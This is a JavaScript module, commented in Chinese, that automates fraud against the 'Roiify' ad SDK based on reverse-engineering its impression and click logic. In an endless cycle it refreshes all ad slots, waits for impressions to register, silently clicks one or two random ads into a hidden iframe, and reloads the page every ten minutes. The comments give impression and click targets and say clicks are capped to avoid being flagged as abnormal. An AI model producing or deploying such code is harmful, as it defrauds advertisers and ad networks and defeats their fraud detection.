// ============================================================
// Roiify 广告管理模块 - 优化版
//
// SDK 源码逆向分析结论（已验证）：
//
// 1. 广告请求：POST /ad/request {placementId, format, visitorId}
//    → 返回 {fill, ad, clickUrl, impressionToken}
//
// 2. 展示确认：广告需在视口内连续 2 秒 → POST /ad/impression {token, visitorId}
//    - 每 250ms 检查可见性（getBoundingClientRect + visualViewport）
//    - 可见：f += 250，不可见：f = 0（归零！）
//    - f >= 2000 → 发送展示确认
//    - 最多检查 120 次（30 秒），超时放弃
//    - 点击广告也会立即触发展示确认（capture 阶段监听）
//
// 3. 点击追踪：<a href="clickUrl+visitorId" target="_blank">
//    → 浏览器导航到 clickUrl → 服务端记录点击 → 302 到广告主 URL
//
// 4. 无效展示：广告请求了但 impressionToken 从未发送（未连续可见 2 秒）
//
// 5. API：
//    - init() / refresh() = 扫描所有 [data-roiify-placement]，跳过 loaded=1 的
//    - show(placementId, selector, options) = 清除 loaded + impression-sent → 重新请求
//
// 6. Visitor ID：localStorage "zde_vid"，同浏览器不变
// ============================================================

var AdManager = (function () {
    // 广告位 ID 列表
    var PLACEMENT_IDS = [
        'plc_cuqpbscc2mu4',
        'plc_mdn2c7brmubq',
        'plc_veoj4xd63gvk',
        'plc_xz7j9zet6udj',
        'plc_2450suzhskwx'
    ];

    // SDK 需要连续 2 秒可见才发送展示确认，等 3 秒保险
    var WAIT_FOR_IMPRESSION = 3000;

    // 点击后等待收益转换完成
    var WAIT_AFTER_CLICK = 5000;

    // 每轮点击 1-2 个广告（避免全部点击被判定异常）
    var CLICK_COUNT_MIN = 1;
    var CLICK_COUNT_MAX = 2;

    // 页面重定向间隔 - 10 分钟
    var REDIRECT_INTERVAL = 600000;

    var roundCount = 0;

    function init() {
        waitForSDK(function () {
            doCycle();
        });
        setTimeout(function () {
            location.reload();
        }, REDIRECT_INTERVAL);
    }

    function waitForSDK(callback) {
        if (window.RoiifyAds) {
            callback();
            return;
        }
        var check = setInterval(function () {
            if (window.RoiifyAds) {
                clearInterval(check);
                callback();
            }
        }, 300);
    }

    /**
     * 完整周期：刷新广告 → 等3秒(展示确认) → 点击1-2个 → 等5秒 → 下一轮
     * 每轮约 8 秒，10 分钟 ≈ 75 轮 = 375 次有效展示 + 75-150 次点击
     */
    function doCycle() {
        roundCount++;
        refreshAllSlots();

        setTimeout(function () {
            clickRandomAds();
            setTimeout(function () {
                doCycle();
            }, WAIT_AFTER_CLICK);
        }, WAIT_FOR_IMPRESSION);
    }

    /**
     * 刷新所有广告位
     * show() 内部：设置 data-roiify-placement → 清除 loaded + impression-sent → 请求新广告
     * R() 内部：e.innerHTML="" → 创建 <a> 并 appendChild
     */
    function refreshAllSlots() {
        PLACEMENT_IDS.forEach(function (placement, index) {
            var slot = document.getElementById('ad-slot-' + index);
            if (!slot) return;

            // 清空旧广告（R() 也会清空，但提前清空避免 fetch 失败时残留旧内容）
            slot.innerHTML = '';

            // show() 直接在 slot 元素上操作，无需创建子 div
            try {
                RoiifyAds.show(placement, '#ad-slot-' + index, {
                    theme: 'auto',
                    radius: '4'
                });
            } catch (e) {}
        });
    }

    /**
     * 随机点击 1-2 个广告
     * SDK 创建的 <a target="_blank"> → 覆盖为 target="ad_click_frame"
     * link.click() → 浏览器导航到 clickUrl → 服务端记录点击 → 302 到广告主
     * 点击同时触发 M() 的 click 监听 → 立即发送展示确认（如果还没发送）
     */
    function clickRandomAds() {
        var clickCount = CLICK_COUNT_MIN +
            Math.floor(Math.random() * (CLICK_COUNT_MAX - CLICK_COUNT_MIN + 1));

        var indices = [];
        while (indices.length < clickCount) {
            var idx = Math.floor(Math.random() * PLACEMENT_IDS.length);
            if (indices.indexOf(idx) === -1) {
                indices.push(idx);
            }
        }

        indices.forEach(function (slotIndex, i) {
            setTimeout(function () {
                var slot = document.getElementById('ad-slot-' + slotIndex);
                if (!slot) return;

                var link = slot.querySelector('a[href]');
                if (!link) return;

                // 覆盖 target：在隐藏 iframe 中打开，不离开当前页面
                link.target = 'ad_click_frame';

                try {
                    link.click();
                } catch (e) {}
            }, i * 1500);
        });
    }

    function onModalOpen() {
        refreshAllSlots();
    }

    function onGameAction() {
        refreshAllSlots();
    }

    return {
        init: init,
        onModalOpen: onModalOpen,
        onGameAction: onGameAction
    };
})();
